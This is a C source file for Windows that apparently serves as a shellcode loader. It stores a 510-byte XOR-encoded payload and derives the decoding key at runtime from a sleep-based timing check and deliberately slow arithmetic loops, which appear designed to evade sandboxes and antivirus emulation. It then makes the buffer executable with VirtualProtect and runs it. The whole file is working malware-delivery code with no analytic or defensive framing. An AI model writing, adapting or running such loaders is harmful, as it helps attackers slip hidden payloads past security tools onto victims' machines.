#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int buflen = 510;
unsigned char buf[] = "\xe6\xd2\x99\x7e\xea\x72\xd6\x9a\x1a\x9a\x5b\xcb\x5b\xca\x48\xcb\x4c\xd2\x2b\x48\x7f\xd2\x91\xc8\x7a\xd2\x91\xc8\x02\xd2\x91\xc8\x3a\xd2\x91\xe8\x4a\xd2\x15\x2d\x50\xd0\x57\xab\xd3\xd2\x2b\x5a\xb6\xa6\x7b\xe6\x18\xb6\x3a\xdb\xdb\x53\x17\xdb\x1b\x5b\xf8\x77\x48\xdb\x4b\xd2\x91\xc8\x3a\x11\x58\xa6\x52\x9b\xca\xfc\x9b\xe2\x02\x91\x18\x95\x9f\xe8\x1a\x9a\x1a\x11\x9a\x12\x1a\x9a\x1a\xd2\x9f\x5a\x6e\xfd\x52\x9b\xca\xca\x91\xd2\x02\xde\x91\xda\x3a\xd3\x1b\x4a\xf9\xcc\x52\x65\xd3\xdb\x91\xae\x92\xd2\x1b\x4c\x57\xab\xd3\xd2\x2b\x5a\xb6\xdb\xdb\x53\x17\xdb\x1b\x5b\x22\x7a\x6f\x6b\x56\x99\x56\xbe\x12\xdf\x23\x4b\x6f\x42\x42\xde\x91\xda\x3e\xd3\x1b\x4a\x7c\xdb\x91\x96\x52\xde\x91\xda\x06\xd3\x1b\x4a\x5b\x11\x1e\x12\x52\x9b\xca\xdb\x42\xdb\x42\xc4\x43\xc0\x5b\xc2\x5b\xc3\x5b\xc0\x52\x19\xf6\xba\x5b\xc8\xe5\x7a\x42\xdb\x43\xc0\x52\x11\x08\x73\x51\x65\xe5\x65\x47\xd3\xa4\xed\x69\xa8\x45\xa9\x28\x9a\x1a\xdb\x4c\xd3\x93\x7c\x52\x1b\xf6\x3a\x1b\x9a\x1a\xd3\x93\x7f\x53\x26\x18\x9a\x13\xb3\xb6\x8f\x0c\x9f\x5b\xce\x53\x13\xfe\xd6\x93\x6b\x5b\x20\x56\xed\x3c\x9d\xe5\x4f\x56\x13\xf0\xf2\x1b\x9b\x1a\x9a\x43\xdb\xa0\xb3\x9a\xf1\x1a\x65\xcf\xf0\x10\xdb\x44\xca\x4a\xd7\x2b\x53\x57\xab\xda\xd2\xe5\x5a\x52\x13\xd8\xd2\xe5\x5a\x52\x13\xdb\xdb\xa0\x70\x15\x45\xfa\x65\xcf\xd2\x93\x5d\x70\x8a\x5b\xc2\x56\x13\xf8\xd2\x93\x63\x5b\x20\x83\x3f\x6e\xfb\xe5\x4f\x9f\x5a\x6e\x90\x53\x65\xd4\xef\xff\x72\x89\x9a\x1a\x9a\x52\x19\xf6\x8a\x52\x13\xf8\xd7\x2b\x53\x70\x9e\x5b\xc2\x52\x13\xe3\xdb\xa0\x98\xc3\x52\x45\x65\xcf\x19\xe2\x9a\x64\xcf\x52\x19\xde\xba\x44\x13\xec\xf0\x5a\xdb\x43\xf2\x1a\x8a\x1a\x9a\x5b\xc2\x52\x13\xe8\xd2\x2b\x53\x5b\x20\x42\x3e\x49\x7f\xe5\x4f\x52\x13\xd9\xd3\x93\x5d\x57\xab\xd3\xd3\x93\x6a\x52\x13\xc0\xd2\x93\x63\x5b\x20\x18\x43\xd2\xc5\xe5\x4f\x99\x62\x1a\xe7\x32\xc2\x5b\xcd\x43\xf2\x1a\xda\x1a\x9a\x5b\xc2\x70\x9a\x40\xdb\xa0\x91\x35\x95\x2a\x65\xcf\xcd\x43\xdb\xa0\xef\x74\xd7\x7b\x65\xcf\xd3\xe5\x54\xf3\xa6\xe5\x65\xe5\xd2\x1b\x59\x52\xb3\xdc\xd2\x9f\x6c\x6f\x2e\x5b\x65\xfd\xc2\x70\x9a\x43\xd3\xdd\x58\xea\x2f\xb8\xcc\xe5\x4f";

void xor_buf(unsigned char buf[], int buflen, unsigned char shift)
{
  for (size_t i = 0; i < buflen; i++)
  {
    if (i % 2 == 0)
    {
      buf[i] = buf[i] ^ shift;
    }
    else
    {
      buf[i] = buf[i] ^ (shift + 128);
    }
  }
}

int check_time(void)
{
  time_t t1 = time(NULL);
  Sleep(3000);
  time_t t2 = time(NULL);
  return t2 - t1; // 3
}

int get_fibo(void)
{
  int i;
  long a = 15432351;
  for (i = 0; i < 1002560; i++)
  {
    if (a % 2 == 0)
    {
      a = a / 2;
    }
    else
    {
      a = 3 * a + 1;
    }
  }
  return a; // 4
}

int get_prime(void)
{
  int i;
  int j;
  int c = 0;
  for (i = 2; i < 32000; i++)
  {
    for (j = 2; j <= i; j++)
    {
      if (i % j == 0 && i == j)
      {
        c = (c + i) % 89;
      }
    }
  }
  return c; // 18
}

int main(void)
{
  int *a = malloc(sizeof(int));
  *a = 42;
  DWORD ignore;
  int (*func)();
  xor_buf(buf, buflen, (unsigned char)((41 * get_fibo() + 6 * get_prime() + check_time()) % 125) + 1);
  VirtualProtect(buf, buflen, PAGE_EXECUTE, &ignore);
  func = (int (*)())buf;
  (int)(*func)();
  return 0;
}
